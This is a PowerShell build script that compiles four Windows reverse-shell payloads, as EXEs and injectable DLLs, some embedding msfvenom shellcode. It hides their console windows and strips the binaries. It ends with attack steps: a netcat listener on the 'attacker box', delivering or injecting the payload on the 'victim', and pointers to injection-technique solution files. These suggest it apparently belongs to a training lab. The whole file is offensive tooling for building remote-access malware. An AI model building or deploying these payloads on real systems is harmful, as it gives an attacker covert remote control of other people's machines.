# payloads/reverse-shell/build.ps1 — builds all 4 reverse-shell variants
# Auto-detects MSVC first, falls back to MinGW-w64.
#
# Usage:
#   powershell -ExecutionPolicy Bypass -File .\build.ps1

$ErrorActionPreference = 'Stop'
Set-Location $PSScriptRoot

function Have-Cmd($name) { $null -ne (Get-Command $name -ErrorAction SilentlyContinue) }

Write-Host "[*] Reminder: edit LHOST + LPORT at the top of each .cpp before building." -ForegroundColor Yellow
Write-Host "[*] For the _sc variants, paste shellcode from msfvenom first." -ForegroundColor Yellow

if (Have-Cmd 'cl') {
    Write-Host "`n[*] Using MSVC (cl.exe)" -ForegroundColor Cyan

    cl /EHsc /O2 /nologo revshell_pure.cpp     /link ws2_32.lib /SUBSYSTEM:WINDOWS /Fe:revshell_pure.exe        | Out-Null
    cl /LD /EHsc /O2 /nologo revshell_pure_dll.cpp /link ws2_32.lib /Fe:revshell_pure_dll.dll                   | Out-Null
    cl /EHsc /O2 /nologo revshell_sc.cpp       /link /SUBSYSTEM:WINDOWS /Fe:revshell_sc.exe                     | Out-Null
    cl /LD /EHsc /O2 /nologo revshell_sc_dll.cpp /Fe:revshell_sc_dll.dll                                        | Out-Null
}
elseif (Have-Cmd 'x86_64-w64-mingw32-g++') {
    Write-Host "`n[*] Using MinGW-w64" -ForegroundColor Cyan

    x86_64-w64-mingw32-g++ -O2 -s -mwindows -o revshell_pure.exe     revshell_pure.cpp     -lws2_32
    x86_64-w64-mingw32-g++ -shared -O2 -s -o revshell_pure_dll.dll revshell_pure_dll.cpp -lws2_32 `
        -Wl,--subsystem,windows,--kill-at
    x86_64-w64-mingw32-g++ -O2 -s -mwindows -o revshell_sc.exe       revshell_sc.cpp
    x86_64-w64-mingw32-g++ -shared -O2 -s -o revshell_sc_dll.dll   revshell_sc_dll.cpp `
        -Wl,--subsystem,windows,--kill-at
}
else {
    Write-Host "`n[!] Neither 'cl' nor 'x86_64-w64-mingw32-g++' found on PATH." -ForegroundColor Red
    Write-Host "    See payloads/README.md for toolchain install instructions." -ForegroundColor Red
    exit 1
}

Write-Host "`n[+] Built:" -ForegroundColor Green
Get-ChildItem *.exe,*.dll |
    Select-Object Name,@{N='KB';E={[math]::Round($_.Length/1KB,1)}} | Format-Table -AutoSize

# Cleanup intermediate artifacts
Get-ChildItem *.obj,*.exp,*.lib -ErrorAction SilentlyContinue | Remove-Item

Write-Host "`n[+] Next steps:" -ForegroundColor Green
Write-Host "    1. Start listener on attacker box:  nc -lvnp <LPORT>"
Write-Host "    2. Deliver / inject the EXE or DLL on the victim"
Write-Host "    3. See docs/SOLUTIONS/13-*.md through 18-*.md for injection techniques"
